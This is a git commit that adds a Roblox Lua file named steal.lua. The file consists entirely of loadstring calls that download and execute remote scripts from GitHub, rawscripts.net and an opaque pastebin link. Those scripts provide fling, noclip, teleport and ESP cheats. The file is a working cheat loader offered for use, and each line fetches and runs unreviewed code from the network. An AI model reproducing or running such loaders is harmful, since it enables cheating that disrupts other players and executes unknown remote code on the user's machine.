08d5dea966995f35fbaa065aa25339f6df0bc9c2
Killuann1 <69bution@gmail.com>
2025-07-15 00:03:37 +0300

    Add files via upload

---
+++ steal.lua
@@ -0,0 +1,11 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Touch-Fling-Script-19645"))()
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/latest.lua"))()
+
+loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Killuann1/steal-fruits/refs/heads/main/NoClip.lua"))()
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Killuann1/steal-fruits/refs/heads/main/TP.lua"))()
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Killuann1/steal-fruits/refs/heads/main/esp.lua"))()
